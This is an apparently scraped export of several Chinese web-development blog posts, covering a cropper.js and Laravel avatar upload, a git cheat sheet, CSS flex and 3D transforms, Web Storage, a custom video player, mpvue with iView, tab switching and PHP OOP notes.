图片外链托管在github,图片无法加载请自备梯子 （1）前端实现（1.1）cropper插件介绍12我们可以使用 cropper插件实现裁切和缩略图功能下载地址为：https://github.com/fengyuanchen/cropper （1.2）cropper插件使用（1.2.1）准备12解压下载下来的压缩包并把dist目录下的：cropper.min.js和cropper.min.css文件复制到项目目录下 （1.2.2）引入类库1234&lt;!--使用绝对路径引入类库，因为cropper是基于jquery的，所以jquery也要引入--&gt;&lt;script src=\"/js/jquery.min.js\"&gt;&lt;/script&gt;&lt;link rel=\"stylesheet\" href=\"/css/cropper.min.css\"&gt;&lt;script src=\"/js/cropper.min.js\"&gt;&lt;/script&gt; （1.2.3）html结构12345678910111213141516171819202122232425&lt;form action=\"{{ route('setface') }}\" method=\"POST\" enctype=\"multipart/form-data\"&gt; {{ csrf_field() }} &lt;div class=\"form-div\"&gt; &lt;input type=\"file\" name=\"face\"&gt; &lt;/div&gt; &lt;!-- 预览图片区域 --&gt; &lt;div class=\"img-container\"&gt; &lt;img id=\"pre_image\"&gt; &lt;/div&gt; &lt;!-- 三个缩略图预区域 --&gt; &lt;div class=\"docs-preview clearfix\"&gt; &lt;div class=\"img-preview preview-lg\"&gt;&lt;/div&gt; &lt;div class=\"img-preview preview-md\"&gt;&lt;/div&gt; &lt;div class=\"img-preview preview-sm\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 保存裁切参数的四个框 --&gt; &lt;input type=\"hidden\" name=\"x\"&gt; &lt;input type=\"hidden\" name=\"y\"&gt; &lt;input type=\"hidden\" name=\"w\"&gt; &lt;input type=\"hidden\" name=\"h\"&gt; &lt;div class=\"form-div\"&gt; &lt;input type=\"submit\" value=\"确认\"&gt; &lt;/div&gt;&lt;/form&gt; （1.2.4）样式文件12345678910111213141516171819202122232425262728293031&lt;!--在头部把样式文件导入，也可以自己修改样式控制裁剪框--&gt;&lt;style&gt; .img-container { width: 240px; height: 240px; float:left; } .img-container #pre_image { width: 100%; } .img-preview { float: left; overflow: hidden; margin-left: 20px; } .preview-lg { width: 240px; height: 240px; } .preview-md { width: 80px; height: 80px; } .preview-sm { width: 35px; height: 35px; }&lt;/style&gt; （1.2.5）js代码123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;script&gt;var preImg = $(\"#pre_image\");// 获取裁切时的四个框var x = $(\"input[name=x]\");var y = $(\"input[name=y]\");var w = $(\"input[name=w]\");var h = $(\"input[name=h]\");// 选择图片时预览图片 并 调用cropper插件$(\"input[name=face]\").change(function(){ // 先消毁，清除一下插件，否则连续调用插件时会失败 preImg.cropper(\"destroy\"); // this.files[0]：获取当前图片并转成URL地址 var url = getObjectUrl( this.files[0] ); console.log( url ) // 设置url到预览图片上 preImg.attr('src', url); // 调出插件 preImg.cropper({ aspectRatio: 1, // 裁切的框形状 preview:'.img-preview', // 显示预览的位置 viewMode:3, // 显示模式：图片不能无限缩小，但可以放大 // 裁切时把参数保存到表单中 crop: function(event) { x.val( event.detail.x ); y.val( event.detail.y ); w.val( event.detail.width ); h.val( event.detail.height ); } });});// 预览时需要使用下面这个函数转换一下function getObjectUrl(file) { var url = null; if (window.createObjectURL != undefined) { url = window.createObjectURL(file) } else if (window.URL != undefined) { url = window.URL.createObjectURL(file) } else if (window.webkitURL != undefined) { url = window.webkitURL.createObjectURL(file) } return url}&lt;/script&gt; （1.2.6）前端实现效果预览 （2）后端保存图片到数据库(2.1)创建迁移文件12&lt;!--为用户表表添加三个字段，用来保存三张缩略图--&gt;php artisan make:migration add_faces_users --table=users （2.1.1）编写迁移文件12345678910111213141516171819202122232425262728293031323334&lt;?phpuse Illuminate\\Support\\Facades\\Schema;use Illuminate\\Database\\Schema\\Blueprint;use Illuminate\\Database\\Migrations\\Migration;class AddFacesUsers extends Migration{ /** * Run the migrations. * * @return void */ public function up() { Schema::table('users', function (Blueprint $table) { $table-&gt;string('bgface')-&gt;nullable()-&gt;comment('大脸'); $table-&gt;string('mdface')-&gt;nullable()-&gt;comment('中脸'); $table-&gt;string('smface')-&gt;nullable()-&gt;comment('小脸'); }); } /** * Reverse the migrations. * * @return void */ public function down() { Schema::table('users', function (Blueprint $table) { $table-&gt;dropColumn(['bgface','mdface','smface']); }); }} （2.1.2）执行迁移1php artisan migrate (2.2)创建表单验证类（2.2.1）创建验证类文件1php artisan make:request FaceRequest （2.2.2）编写验证规则1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace App\\Http\\Requests;use Illuminate\\Foundation\\Http\\FormRequest;class FaceRequest extends FormRequest{ /** * Determine if the user is authorized to make this request. * * @return bool */ public function authorize() { return true; } /** * Get the validation rules that apply to the request. * * @return array */ public function rules() { return [ &lt;!--最大上传大小不能超过4m--&gt; 'face' =&gt; 'required|image|max:4096', 'x' =&gt; 'required|numeric|min:0', 'y' =&gt; 'required|numeric|min:0', 'w' =&gt; 'required|numeric|min:200', 'h' =&gt; 'required|numeric|min:200', ]; }} (2.3)配置路由123&lt;!--配置一个用来处理头像的路由--&gt;//修改头像Route::post(\"/face\",'FaceController@face')-&gt;name('setface'); (2.4)FaceController中添加处理头像的代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!--使用composer安装图片处理类--&gt;composer require intervention/image&lt;!--修改 config/app.php ，注册类到 $providers 数组--&gt;Intervention\\Image\\ImageServiceProvider::class&lt;!--在 $alias 数组中定义类别名--&gt;'Image'=&gt; Intervention\\Image\\Facades\\Image::class&lt;!--引入相关类--&gt;use Image;use App\\Models\\User;use Storage;use App\\Http\\Requests\\FaceRequest;&lt;!--添加face方法--&gt;public function face(FaceRequest $req) { if($req-&gt;has('face') &amp;&amp; $req-&gt;face-&gt;isValid()) { // 当前图片上传的位置 $oldimage = $req-&gt;face-&gt;path(); // 保存原图片 // 获取当前日期 $date = date('Ymd'); $oriImg = $req-&gt;face-&gt;store('face/'.$date); // 打开要处理的图片 $img = Image::make($oldimage); // 裁切图片 $img-&gt;crop((int)$req-&gt;w,(int)$req-&gt;h,(int)$req-&gt;x,(int)$req-&gt;y); // 生成缩略图并保存 // 拼出这个缩略图的名字 $bgname = str_replace('face/'.$date.'/', 'face/'.$date.'/bg_', $oriImg); $img-&gt;resize(240,240); $img-&gt;save('./uploads/'.$bgname); $mdname = str_replace('face/'.$date.'/', 'face/'.$date.'/md_', $oriImg); $img-&gt;resize(80,80); $img-&gt;save('./uploads/'.$mdname); $smname = str_replace('face/'.$date.'/', 'face/'.$date.'/sm_', $oriImg); $img-&gt;resize(35,35); $img-&gt;save('./uploads/'.$smname); // 先取出用户的信息 $user = User::find( session('id') ); // 删除原头像 Storage::delete( $user-&gt;face ); Storage::delete( $user-&gt;bgface ); Storage::delete( $user-&gt;mdface ); Storage::delete( $user-&gt;smface ); // 更新新脸 $user-&gt;face = $oriImg; $user-&gt;bgface = $bgname; $user-&gt;mdface = $mdname; $user-&gt;smface = $smname; $user-&gt;save(); // 修改SESSION中的图片 session([ 'smface' =&gt; $smname, 'bgface' =&gt; $bgname, ]); return redirect()-&gt;route('face'); } } （3）注意事项 数据库字段要对应正确，不然保存数据库会失败 因为新的头像要保存到session中，所以如果没效果要多清空缓存试试 最重要的是一定要有耐心 注意一下文件的上传大小 有问题请给我发邮件","link":"/2018/11/15/6/"},{"title":"Git 速查表（速查大全）","text":"原文链接：http://blog.kesixin.xin/article/61 今天查git命令的时候看到这篇文章，总结的很好，转载一发 Git命令大致分为这几个模块: 序号 模块 功能 1 CREATE 关于创建的 2 LOCAL CHANGES 关于本地改动方面的 3 COMMIT HISTORY 关于提交历史的 4 BRANCHES &amp; TAGS 关于分支和标签类的 5 UPDATE &amp; PUBLISH 关于更新和发布的 6 MERGE &amp; REBASE 关于分支合并类的 7 UNDO 关于撤销类的 8 SUBMODULE 关于子模块 CREATE 从远程仓库获取代码 git clone ssh://user@domain.com/repo.git 初始化本地仓库 git init LOCAL CHANGES 查看仓库的状态,(显示已改动的文件) git status 比较工作区与最新本地版本库 git diff git diff &lt;fileName&gt; 添加所有变化（新增 new、修改 modified、删除 deleted）到暂存区 git add -A 添加所有变化（新增 new、修改 modified）到暂存区，不包括被删除(deleted)文件 git add . 添加修改(modified)和被删除(deleted)文件，不包括新文件(new)也就是不是被追踪文件（untracked） git add -u 添加文件内某些改动到暂存区 git add -p &lt;file&gt; 提交所有的放在暂存区的文件和已经修改（不在暂存区）的文件，且问件是要被追踪（tracked）的 git commit -a 提交所有被在暂存区的问件 git commit 修改上一次提交日志 $ git commit --amend COMMIT HISTORY 查看提交日志 git log 跟踪查看某个文件的历史修改记录 git log -p &lt;file&gt; 查看文件是谁什么时候修改什么地方 git blame &lt;file&gt; BRANCHES &amp; TAGS 查看所有分支（包括远程分支） git branch -a 查看所有分支（包括远程分支）和最后一次提交日志 git branch -av 切换分支 git checkout &lt;branch&gt; 新建分支，不带old-branch为默认在当前分支上建立新分支 git branch &lt;new-branch&gt; &lt;old-branch&gt; 新建并且换分支 git checkout -b &lt;new-branch&gt; 删除分支，先切换其他分支再删除 git branch -d &lt;branch&gt; 删除远程分支 git push origin --delete &lt;branch&gt; 查看标签 git tag 新建标签 git tag &lt;tag-name&gt; 删除标签 git tag -d &lt;tag-name&gt; 推送标签到远程 git push origin tagname git push origin --tags UPDATE &amp; PUBLISH 列出所有的仓库地址 git remote -v 查看某个仓库的信息 git remote show &lt;remote&gt; 添加仓库地址 git remote add &lt;shortname&gt; &lt;url&gt; 从远程更新代码到本地但不合并 git fetch &lt;remote&gt; 从远程更新代码到本地且合并 git pull &lt;remote&gt; &lt;branch&gt; 发布到远程地址 git push &lt;remote&gt; &lt;branch&gt; 删除远程地址分支 git branch -dr &lt;remote/branch&gt; 上传标签 git push --tags MERGE &amp; REBASE 合并目标分支到本地分支 git merge &lt;branch&gt; 合并分支，但是不合并提交记录（commit），rebase合并如果有冲突则一个一个文件的去合并解决冲突 git rebase &lt;branch&gt; 合并终止 git rebase --abort 继续合并 git rebase --continue 使用配置的合并工具来解决冲突 git mergetool 添加已手动合并的文件 git add &lt;resolved-file&gt; 删除已手动合并的文件 git rm &lt;resolved-file&gt; UNDO 回退到最近一个提交 git reset --hard HEAD 回退到上一次提交（倒数第二次） git reset --hard HEAD^ 回退某次提交的某个文件 git checkout HEAD &lt;file&gt; 回退到某个提交，但是不删除commit git revert &lt;commit&gt; 彻底回退到某个提交（commit和代码都回退了） git reset --hard &lt;commit&gt; 回退到某个提交（commit回退，代码保留） git reset &lt;commit&gt; 回退到某个提交，并保留以更改的文件 git reset --keep &lt;commit&gt; SUBMODULE 添加子模块 git submodule add https://github.com/xxxxxx/Test 克隆你有子模块的项目 // 方法一 git clone https://github.com/xxxxxx/MainProject cd MainProject // 子模块目录Test没有文件 cd Test git submodule init git submodule update // 执行完后就有子模块的代码了 //方法二 // 自动更新子模块中的代码 git clone --recurse-submodules https://github.com/xxxxxx/MainProject 合并两个不同的项目 // 需使用 `--allow-unrelated-histories` // 将远程master项目合并到你本地项目 git pull origin master --allow-unrelated-histories","link":"/2018/11/15/7/"},{"title":"css3之flex伸缩布局详解","text":"下面介绍一种比用浮动定位更灵活的布局方式，是的，就是flex伸缩布局，flex伸缩布局也常用于移动端的布局，因为相对于possion,float，采用flex伸缩布局更灵活，也相对的对手机的资源消耗较少！ 伸缩布局会用到的属性 display: flex;让元素编程伸缩容器 flex-direction：row|row-reverse|column|column-reverse主轴方向，加reverse就是表示相反的方向 justify-content:flex-start|flex-end|center|space-around|space-between设置伸缩项目在主轴方向上的对其方式 flex-wrap: wrap(换行)|nowrap(不换行)控制伸缩项目是否换行 align-content：flex-start|flex-end|center|space-around|space-between处理换行后的结果 align-items：stretch|flex-start|flex-end|center处理不换行的结果(侧轴对齐) flex: 1;控制伸缩项目在伸缩容器中所占的剩余空间 align-self：flex-start|flex-end|center|space-around|space-between个别调整元素位置 order: 10;是用来调整顺序的 规则: 数字越小 元素越靠前 下面给出排列顺序的代码，其他属性请大家自行测试123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;排列顺序&lt;/title&gt;&lt;style&gt; ul { width: 500px; height: 500px; list-style: none; border: 1px solid #000; margin: 0 auto; padding: 0; } li { width: 50px; height: 50px; line-height: 50px; text-align: center; border: 1px solid #ccc; background-color: hotpink; float: left; } ul { display: flex; } li:nth-child(1) { order: 5; } li:nth-child(2) { order: 2; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;ul&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2018/11/15/css3之flex布局详解/"},{"title":"css3之3D转换","text":"css3的3D转换，很有意思的一个特效 用到的属性 transform: rotateX(-175deg);沿着x轴旋转 transform: rotateY(-70deg);沿着y轴旋转 transform: rotateZ(360deg);沿着z轴旋转 perspective: 1000px; 规定眼睛距离元素的距离 transform-style: preserve-3d;作用是让该元素中的所有转换元素显示成3D效果 background-position;设置背景图像的起始位置 实现的效果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"./css/font-awesome.min.css\"&gt; &lt;style&gt; html,body,ul{ margin: 0; padding: 0; } .carousel{ position: relative; width: 560px; height: 300px; box-shadow: 0 0 1px #ccc; margin: 100px auto; } ul{ list-style: none; width: 560px; height: 300px; } li{ float: left; position: relative; width: 112px; height: 100%; transform-style: preserve-3d; transition: all 1s; } span{ position: absolute; top: 0; left: 0; width: 100%; height: 100%; } span:nth-child(1){ transform: translateZ(150px); background-image: url(./images/1.jpg); } span:nth-child(2){ transform: rotateX(90deg) translateZ(150px); background-image: url(./images/2.jpg); } span:nth-child(3){ transform: rotateX(180deg) translateZ(150px); background-image: url(./images/3.jpg); } span:nth-child(4){ transform: rotateX(270deg) translateZ(150px); background-image: url(./images/4.jpg); } li:nth-child(2) span{ background-position: -112px; } li:nth-child(3) span{ background-position: -224px; } li:nth-child(4) span{ background-position: -336px; } li:nth-child(5) span{ background-position: -448px; } li:nth-child(2){ transition-delay: 0.25s; } li:nth-child(3){ transition-delay: 0.5s; } li:nth-child(4){ transition-delay: 0.75s; } li:nth-child(5){ transition-delay: 1s; } .carousel a{ text-decoration: none; position: absolute; top: 50%; transform: translateY(-50%); color:#fff; font-size: 40px; } a.prev{ left: 0; } a.next{ right: 0; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"carousel\"&gt; &lt;ul&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;a href=\"javascript:;\" class=\"prev fa fa-chevron-left\"&gt;&lt;/a&gt; &lt;a href=\"javascript:;\" class=\"next fa fa-chevron-right\"&gt;&lt;/a&gt; &lt;/div&gt; &lt;script&gt; // 获取元素 两个按钮 li var aLi=document.querySelectorAll('li'); var prev=document.querySelector('.prev'); var next=document.querySelector('.next'); var lastLi=document.querySelector('li:last-child'); var flag=true; lastLi.addEventListener(\"transitionend\",function(){ flag=true; }) var num=0; // 给按钮添加点击事件 prev.onclick=function(){ if(flag==false){return;} flag=false; num++; // 遍历所有li 并且给每个li添加样式 for(var i=0;i&lt;aLi.length;i++){ aLi[i].style.transform=\"rotateX(\"+num*90+\"deg)\"; } } next.onclick=function(){ if(flag==false){return;} flag=false; num--; // 遍历所有li 并且给每个li添加样式 for(var i=0;i&lt;aLi.length;i++){ aLi[i].style.transform=\"rotateX(\"+num*90+\"deg)\"; } } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2018/11/15/css3之3D转换/"},{"title":"html5之客户端存储","text":"WebStorage介绍所谓的WebStorage指的是客户端存储,在这里指的是浏览器端存储,比如在网站上自动登陆这些功能,其实就是把一些少量的数据存储在浏览器等客户端中,这样可以减少没必要的请求到服务器,降低服务器的压力,给用户提供更好的体验. WebStorage的三种存储方式 cookie: 广泛使用 存储量4kb左右 会在浏览器和服务器间传递 一般由服务器端创建 可以设置存储时间(默认和session一样) cookie不容易操作 jquery.cookie.js插件 session(会话)Storage: H5新增 存储量5M左右 只会在浏览器存储数据(浏览器的内存中) 只会由浏览器端创建 存储时间是打开浏览器开始关闭浏览器消失 方法简洁明了 容易操作 local(本地)Storage: H5新增 存储量5M左右 只会在浏览器存储数据(存储在硬盘中) 只会由浏览器端创建 永久存储除非手动删除 方法简介明了 容易操作 localStorage 添加数据: window.localStorage.setItem(key,value); 获取数据: window.localStorage.getItem(key); 移除数据: window.localStorage.removeItem(key); 清除数据: window.localStorage.clear(); 获取key: window.localStorage.key(n); sessionStorage 添加数据: window.sessionStorage.setItem(key,value); 获取数据: window.sessionStorage.getItem(key); 移除数据: window.sessionStorage.removeItem(key); 清除数据: window.sessionStorage.clear(); 获取key: window.sessionStorage.key(n从0开始); 应用场景: 存储一些少量临时的数据(比较少用) 总结 localStorage和sessionStorage只能存储json 存储的数据不能太多 太多浏览器会卡","link":"/2018/11/15/html5之客户端存储/"},{"title":"html5之自定义视频播放器","text":"自定义样式的视频播放器 效果 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;自定义视频播放器&lt;/title&gt; &lt;!-- 所有的库一定都在当前页面的css的前面 --&gt; &lt;link rel=\"stylesheet\" href=\"./css/font-awesome.min.css\"&gt; &lt;!-- &lt;link rel=\"stylesheet\" href=\"./css/font-awesome.css\"&gt; --&gt; &lt;link rel=\"stylesheet\" href=\"./css/main.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"player\"&gt; &lt;!-- 视频 --&gt; &lt;video src=\"./movie/movie02.mp4\" width=\"100%\" height=\"100%\"&gt; &lt;!-- &lt;source src=\"./movie//movie02.mp4\"&gt; --&gt; &lt;/video&gt; &lt;!-- 控制菜单 --&gt; &lt;div class=\"controls\"&gt; &lt;!-- 播放按钮 --&gt; &lt;a href=\"javascript:;\" class=\"play-btn fa fa-play-circle-o\"&gt;&lt;/a&gt; &lt;!-- 进度条 --&gt; &lt;div class=\"progress\"&gt; &lt;div class=\"progress-bar\" style=\"width: 0%\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 播放时间 --&gt; &lt;div class=\"time\"&gt; &lt;span class=\"current\"&gt;00:00:00&lt;/span&gt;/ &lt;span class=\"total\"&gt;00:00:00&lt;/span&gt; &lt;/div&gt; &lt;!-- 全屏按钮 --&gt; &lt;a href=\"javascript:;\" class=\"fullscreen fa fa-expand\"&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; // 功能: // 1.视频的播放与暂停(图标变化) // 2.总时间的显示 // 3.当前时间的显示(进度) // 4.进度条的显示 // 5.跳跃播放 // 6.全屏 // 下面开始实现功能： // 1.视频的播放与暂停(图标变化) // 获取视频以及按钮 var video=document.querySelector(\"video\"); var btn=document.querySelector(\".play-btn\"); btn.addEventListener(\"click\",function(){ // 判断视频状态并改变按钮 if(video.paused){ video.play(); // this.classList.toggle(\"fa-pause-circle-o\"); this.classList.remove(\"fa-play-circle-o\"); this.classList.add(\"fa-pause-circle-o\"); }else{ video.pause(); this.classList.remove(\"fa-pause-circle-o\"); this.classList.add(\"fa-play-circle-o\"); } }); // 2.总时间的显示 // 获取总时间的按钮 var total=document.querySelector(\".total\"); video.oncanplay=function(){ var h=Math.floor(video.duration/3600); var m=Math.floor(video.duration/60-(h*60)); var s=Math.floor(video.duration%60); h=h&lt;10?'0'+h:h; m=m&lt;10?'0'+m:m; s=s&lt;10?'0'+s:s; total.innerHTML=h+':'+m+':'+s; } // 获取当前时间 var current=document.querySelector(\".current\"); // 获取进度条 var progressBar = document.querySelector(\".progress-bar\"); video.ontimeupdate=function(){ var h=Math.floor(video.currentTime/3600); var m=Math.floor(video.currentTime/60-(h*60)); var s=Math.floor(video.currentTime%60); h=h&lt;10?'0'+h:h; m=m&lt;10?'0'+m:m; s=s&lt;10?'0'+s:s; current.innerHTML=h+':'+m+':'+s; // 计算公式 进度条的长度 = 当前时间 / 总时间 * 100 + '%' progressBar.style.width = video.currentTime / video.duration * 100 + '%'; } //跳跃播放 // 获取进度条 var progress=document.querySelector(\".progress\"); progress.addEventListener(\"click\",function(event){ var clickX=event.offsetX; var width=this.offsetWidth video.currentTime = clickX / width * video.duration; }); // 全屏 // 获取按钮 var fullscreen = document.querySelector(\".fullscreen\"); fullscreen.onclick = function () { // 请求全屏 video.webkitRequestFullScreen(); } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2018/11/15/html5之自定义视频播放器/"},{"title":"mpvue搭配iView开发小程序","text":"一起进步，一起共勉~ 初始化mpvue项目需提前安装好node跟npm，请自行google安装 1234567891011# 全局安装 vue-cli$ npm install --global vue-cli# 创建一个基于 mpvue-quickstart 模板的新项目$ vue init mpvue/mpvue-quickstart my-project# 安装依赖$ cd my-project$ npm install# 启动构建$ npm run dev 接下来启动微信开发者工具，引入项目即可预览到 mpvue 小程序！ 使用 iView 组件库1、下载iView 从这里下载iview-weapp项目 2、配置iView 将iview-weapp中的dist文件夹(此处我重命名为iview,以便区分)复制到mpvue项目的输出目录中(默认是dist，编译后的vue代码在此) 3、使用iView 比如，现在我要在src/pages/index/index.vue中使用iView中的i-button组件，那么就先要在src/pages/index/main.json（如果没有该文件，则新建一个）中进行如下配置： 12345{ \"usingComponents\": { \"i-button\": \"../../iview/button/index\" }} 经过上一步的配置，我们就可以开始在src/pages/index/index.vue中使用这个i-button组件了，就像这样： 12345&lt;template&gt; &lt;div class=\"container\"&gt; &lt;i-button type=\"primary\" @click=\"bindViewTap\"&gt;这是一个按钮&lt;/i-button&gt; &lt;/div&gt;&lt;/template&gt; 运行这个小程序，能看到如下的样子：","link":"/2018/11/15/mpvue搭配iView开发小程序/"},{"title":"html5新特性实现tab选项卡切换","text":"之前学习了html,以及css，写后端也有一段时间了，现在把更多的精力放在了前端，那么，就从html5以及css3开始吧~~~，今天主要是实现了tab选项卡切换，之前也写过，现在用html5获取元素的新方法实现了一下，话不多说，代码如下 html代码分析代码可以知道，选项卡的class为active的时候，选项卡就被选中，当内容section的style属性为display:block时，内容就被选中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; body { margin: 0; padding: 0; background-color: #F7F7F7; } .tabs { width: 400px; margin: 30px auto; background-color: #FFF; border: 1px solid #C0DCC0; box-sizing: border-box; } .tabs nav { height: 40px; text-align: center; line-height: 40px; overflow: hidden; background-color: #C0DCC0; /* 伸缩盒模型 */ display: flex; } nav a { display: block; width: 100px; border-right: 1px solid #FFF; color: #000; text-decoration: none; } nav a:last-child { border-right: none; } nav a.active { background-color: #9BAF9B; } .cont { overflow: hidden; display: none; } .cont ol { line-height: 30px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"tabs\"&gt; &lt;nav&gt; &lt;a href=\"javascript:;\" data-cont=\"local\" class=\"active\"&gt;国内新闻&lt;/a&gt; &lt;a href=\"javascript:;\" data-cont=\"global\" &gt;国际新闻&lt;/a&gt; &lt;a href=\"javascript:;\" data-cont=\"sports\" &gt;体育新闻&lt;/a&gt; &lt;a href=\"javascript:;\" data-cont=\"funny\"&gt;娱乐新闻&lt;/a&gt; &lt;/nav&gt; &lt;section class=\"cont\" id=\"local\" style=\"display:block\"&gt; &lt;ol&gt; &lt;li&gt;国内新闻&lt;/li&gt; &lt;li&gt;禽流感在感在广1处继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广在全国暴发&lt;/li&gt; &lt;li&gt;禽流感在全国多处继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;section class=\"cont\" id=\"global\" &gt; &lt;ol&gt; &lt;li&gt;国际新闻&lt;/li&gt; &lt;li&gt;禽流感次发生蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广减产绝收发&lt;/li&gt; &lt;li&gt;禽流感在全国多作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;section class=\"cont\" id=\"sports\"&gt; &lt;ol&gt; &lt;li&gt;体育新闻&lt;/li&gt; &lt;li&gt;禽流感在全国多处农作物农延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;li&gt;禽流感在全农作物继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;section class=\"cont\" id=\"funny\"&gt; &lt;ol&gt; &lt;li&gt;娱乐新闻&lt;/li&gt; &lt;li&gt;禽流感在全国物农延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;li&gt;禽流感在全农作物继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;/div&gt; js代码内容卡指内容，tab卡指点击的选项123456789101112131415161718192021222324252627282930&lt;script&gt; &lt;!--document.querySelectorAll获取所有的a标签--&gt; var aArr=document.querySelectorAll('a'); &lt;!--循环遍历--&gt; for(var i=0;i&lt;aArr.length;i++){ &lt;!--给每个获取到的元素添加点击事件--&gt; aArr[i].onclick=function(){ &lt;!--获取当前激活的tab选项卡--&gt; var active=document.querySelector(\".active\"); &lt;!--移除之前的选项卡激活属性--&gt; active.classList.remove(\"active\"); &lt;!--给当前点击的选项卡添加激活属性--&gt; this.classList.add(\"active\"); &lt;!--获取当前的section标签id名字--&gt; var name=this.getAttribute(\"data-cont\"); &lt;!--根据获取到的名字获取当前的内容卡--&gt; var section=document.getElementById(name); &lt;!--获取所有class为cont的元素，并循环遍历，取消所有内容卡的样式--&gt; var cont = document.getElementsByClassName(\"cont\"); for(var i=0;i&lt;cont.length;i++){ cont[i].style.display=\"none\"; } &lt;!--激活当前内容卡的样式--&gt; section.style.display=\"block\"; } }&lt;/script&gt; 总结排它思想","link":"/2018/11/15/html5新特性实现tab切换/"},{"title":"php面向对象容易忘记的几个知识点","text":"好几个月没更新博客了，这段时间心态好像崩了，干啥都没动力，而且还被各种烦心事干扰着，真想回去农村住几个月。。。 面向对象编程时，一般私有和受保护的属性和方法名前可以添加一个_，让开发人员通过名字就知道它的特性 在类的外面，类中的 常量 和 静态成员 直接使用 类名:: 来访问 在类的内部使用 $this-&gt;访问类中的属性和方法 在类中使用self:: 访问常量和静态成员 命名空间使用的是反斜杠\\ 在同一个命名空间下，可以省略命名空间 使用 use时，也需要把文件引入进来 自动加载类时，需要用到spl_autoload_register函数 在类中我们可以使用static定义静态成员。静态成员可以是静态属性也可以是静态方法 在类外部使用 类名:: 来访问静态成员,在类内部使用 self:: 访问静态成员 静态成员和普通成员区别？静态成员：静态成员属于类，无论有多少个对象，值只有一个;普通成员：普通成员属于具体的对象，每个对象拥有自己的属性值。 一个类只能继承自一个父类（单继承），不能同时继承多个类 $this 代表实例化的那个对象 